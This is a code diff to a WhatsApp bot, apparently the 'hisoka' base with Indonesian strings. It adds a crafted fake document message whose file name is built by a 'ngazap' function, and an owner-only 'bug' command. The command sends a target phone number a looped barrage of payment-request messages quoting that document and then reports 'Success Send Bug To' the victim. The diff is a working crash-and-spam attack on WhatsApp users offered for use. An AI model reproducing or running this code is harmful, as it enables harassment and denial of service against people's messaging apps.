@@ -520,7 +520,24 @@
                       }
                       break
 
-
+///
+const doc = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
+},
+"message": {
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
+"mimetype": "application/octet-stream",
+"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
+"fileLength": "64455",
+"pageCount": 1,
+"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
+"fileName": `@ikiyyye${ngazap(prefix)}`,
+"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
+}}}
+//
 
 
 case 'menu':
@@ -654,7 +671,27 @@ break
                                   hisoka.send5ButMsg(m.chat, anu, hisoka.user.name, btn)
                                   }
                                   break
-         
+         case 'bug': {
+if (!isCreator) throw mess.owner
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+reply(`Baiklah Tuan`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: hisoka.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `@ikiyyye`,
+}
+}}), { userJid: m.chat, quoted: doc})
+hisoka.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
+}
+break
             case 'react': {
                           if (!isCreator) throw mess.owner
                           reactionMessage = {
